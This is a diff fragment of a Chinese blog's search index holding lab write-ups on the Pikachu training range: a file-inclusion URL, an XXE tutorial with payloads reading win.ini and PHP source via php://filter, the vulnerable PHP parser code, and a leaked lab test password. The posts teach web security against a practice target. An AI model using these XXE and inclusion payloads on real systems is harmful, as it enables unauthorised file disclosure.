+
+<p>&#x3D;</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">17.129</span>:<span class="number">8000</span>/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/<span class="number">2025</span>/<span class="number">02</span>/<span class="number">03</span>/<span class="number">72956067</span>a035f759000198096914.png&amp;submit=%E6%<span class="number">8</span>F%<span class="number">90</span>%E4%BA%A4%E6%<span class="number">9</span>F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+<p>完美！</p>
+<p>![](..&#x2F;..&#x2F;img&#x2F;docs&#x2F;pikachu&#x2F;Unsafe Fileupload&#x2F;1738553350413-a2f51e0a-82ae-4f3f-adab-7e92fda73ce2.png)</p>
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XXE</title>
+    <url>/posts/57467.html</url>
+    <content><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>XXE - “<strong>xml external entity injection</strong>“，”xml 外部实体注入漏洞”。</p>
+<p>XML 指的是可拓展标记语言(extensible markup language)</p>
+<p>菜鸟教程：<a href="about:blank">https://www.runoob.com/xml/xml-tutorial.html</a></p>
+<p>XML 从入门到深入：<a href="https://www.cnblogs.com/antLaddie/p/14823874.html">https://www.cnblogs.com/antLaddie/p/14823874.html</a></p>
+<p><strong>XML 声明</strong></p>
+<p>必须在第一行，参数有 version, encoding, standalone</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>DTD(Document Type Define)文档类型定义</strong></p>
+<p>用于描述 XML 文档结构</p>
+<p><strong>DTD 定义文档规则（DOCTYPE）</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">DTD文档的声明及引用有三种：</span><br><span class="line">内部DTD文档：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE  根元素[定义元素属性等等内容]&gt;</span></span><br><span class="line">外部DTD文档：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素  <span class="keyword">SYSTEM</span> <span class="string">&#x27;DTD文件路径&#x27;</span>&gt;</span></span><br><span class="line">内外部DTD文档结合：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素  <span class="keyword">SYSTEM</span> <span class="string">&#x27;DTD文件路径&#x27;</span>[定义元素属性等等内容]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>DTD 元素定义（ELEMENT）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：&lt;!ELEMENT 元素名称(NAME)  元素类型(COUTENT)&gt;</span><br><span class="line">    注：ELEMENT关键字</span><br><span class="line">元素名称：就是自定义的子标签名称</span><br><span class="line">元素类型：</span><br><span class="line">    EMPTY：该元素不能包含子元素和文本，但是可以有属性，这类元素称为自闭和标签</span><br><span class="line">    ANY：该元素可以包含任意在DTD中定义的元素内容</span><br><span class="line">    #PCDATA：可以包含任何字符数据，设置这个就不能包含子元素了，一般设置具体value</span><br><span class="line">    混合元素类型：只包含子元素，并且这些子元素没有文本</span><br><span class="line">    混合类型：包含子元素和文本数据混合体</span><br></pre></td></tr></table></figure>
+
+<p><strong>DTD 属性定义（ATTLIST）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：&lt;!ATTLIST 元素名称 属性名称 类型 属性特点&gt;</span><br><span class="line">元素名称：我们自定义的元素名称</span><br><span class="line">属性类型：我们为元素上添加自定义属性</span><br><span class="line">类型：</span><br><span class="line">    CDATA：</span><br><span class="line">        任意字符（理解为任意字符的字符串）</span><br><span class="line">    ID：</span><br><span class="line">        以字母开头唯一值字符串，</span><br><span class="line">    IDREF/IDREFS：</span><br><span class="line">        可以指向文档中其它地方声明的ID类型值（设置此值是可以在文档上存在的）</span><br><span class="line">        使用IDREFS时可以使用空格隔开</span><br><span class="line">    NMTOKEN/NMTOKENS：</span><br><span class="line">        NMTOKEN是CDATA的一个子集，设置该属性时只能写英文字母、数字、句号、破折号</span><br><span class="line">        下划线、冒号，但是属性值里面不能有空格　　　　  NMTOKENS：它是复数，如果设置多个值由空格隔开　　 Enumerated:　　　　　事先定义好一些值，属性的值必须在所列出的值范围内</span><br><span class="line">属性特点：</span><br><span class="line">    #REQUIRED</span><br><span class="line">        表示必须设置此属性</span><br><span class="line">    #IMPLIED</span><br><span class="line">        表示此属性可写可不写</span><br><span class="line">    #FIXED value</span><br><span class="line">        表示元素实例中该属性的值必须是指定的固定值</span><br><span class="line">    #Default value</span><br><span class="line">        为属性提供一个默认值</span><br></pre></td></tr></table></figure>
+
+<p><strong>DTD 实体定义（ENTITY）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实体分类：</span><br><span class="line">    普通内部实体，普通外部实体，内部参数实体，外部参数实体</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line">    普通内部实体定义：&lt;!ENTITY 实体名 &quot;实体值&quot;&gt;</span><br><span class="line">    普通外部实体引入：&lt;!ENTITY 实体名 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">    内部参数实体定义：&lt;!ENTITY % 实体名 &quot;实体值&quot;&gt;</span><br><span class="line">    外部参数实体引入：&lt;!ENTITY % 实体名 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line"></span><br><span class="line">示例定义：</span><br><span class="line">    &lt;!ENTITY name &quot;pikachu&quot;&gt;</span><br><span class="line">    &lt;!ENTITY address &quot;Kali Linux&quot;&gt;</span><br><span class="line">示例XML里使用：</span><br><span class="line">    &lt;name&gt;&amp;name;&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">使用范围：定义实体分为内部实体（定义在当前xml文件）和外部实体（定义在外部dtd文件里）</span><br></pre></td></tr></table></figure>
+
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>我们输入普通的文本，发现会弹出这个，并且我们从浏览器或者 hackbar 插件中可以知道是 POST 请求，并且有两个参数，一个是 xml，一个是 submit。</p>
+<p><img src="/../../img/docs/pikachu/XXE/1739618316480-9799684b-945d-4902-8c48-ce94390c9ebd.png"></p>
+<p>根据上面的 XML 声明、DTD 文档类型定义、DTD 实体我们就可以构造一个</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">pi</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">text</span> <span class="string">&quot;pikachu&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">pi</span>&gt;</span><span class="symbol">&amp;text;</span><span class="tag">&lt;/<span class="name">pi</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有回显，输出 pikachu（上面的根元素和实体名任意，只需要实体名与下面的实体元素名称相同就行）</p>
+<p><img src="/../../img/docs/pikachu/XXE/1739671184230-29b4ab28-b7c1-4624-bb43-fa82ea7ea15a.png"></p>
+<p><strong>XML DTD 外部引用</strong></p>
+<p><strong>支持 file http 还有各种伪协议</strong></p>
+<p>我们还可以通过路径来回显，如果成功，则代表可以访问文件。（下面代码限于 Windows 服务器，我的靶场在 Linux docker 里面，试了几遍没有试出来。）</p>
+<p><strong>使用 file 路径（文件绝对路径）</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">pi</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">text</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">pi</span>&gt;</span><span class="symbol">&amp;text;</span><span class="tag">&lt;/<span class="name">pi</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/XXE/1739672218034-20141404-07c1-4f2d-bee5-a1bd48622295.png"></p>
+<p><strong>使用 PHP 伪协议</strong></p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">pi</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">text</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=E:/Soft/phpstudy_pro/WWW/pikachu/vul/xxe/xxe_1.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">pi</span>&gt;</span><span class="symbol">&amp;text;</span><span class="tag">&lt;/<span class="name">pi</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../img/docs/pikachu/XXE/1739672840755-33677208-c389-4206-a27b-eb77165436e4.png"></p>
+<p><img src="/../../img/docs/pikachu/XXE/1739672854232-56a5e93c-4dc2-49a9-bd01-429bb7b88614.png"></p>
+<p><strong>无回显操作</strong></p>
+<p>看网上有的说不能操作，还有的教程往服务端放了两个文件，一个文件是通过 GET 或者 POST 协议来接收数据，然后对 base64 进行解码，进行保存文件(php 文件)，然后一个外部的 XML 文件用来之后payload 的外部引用。</p>
+<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="variable">$xml</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>];</span><br><span class="line">  <span class="comment">//    $xml = $test;</span></span><br><span class="line">  <span class="variable">$data</span> = @<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$data</span>)&#123;</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体来说用了simplexml_load_string 函数对 xml 字符串解析成一个对象。</p>
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>敏感信息泄露</title>
+    <url>/posts/2190.html</url>
+    <content><![CDATA[<p>它这里是一个登录界面，由于这章的原因，所以我们就不找 SQL 的注入点了。</p>
+<h1 id="敏感信息一"><a href="#敏感信息一" class="headerlink" title="敏感信息一"></a>敏感信息一</h1><p>我们用浏览器的查看器，定位到登录框，就可以看到有一行注释，就泄露了一个测试账号的账号密码。</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">测试账号:lili/<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="敏感信息二"><a href="#敏感信息二" class="headerlink" title="敏感信息二"></a>敏感信息二</h1><p>我们把 php 那个文件名删掉，可以看到一个目录，这也是敏感信息泄露。</p>
+<p><img src="/../../img/docs/pikachu/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/1738574032795-677e22e9-b509-4456-8d35-eb5091bbd6d6.png"></p>
+]]></content>
+      <categories>
+        <category>网安</category>
+        <category>靶场</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>网安</tag>
+      </tags>
   </entry>
   <entry>
     <title>Pikachu靶场————暴力破解</title>
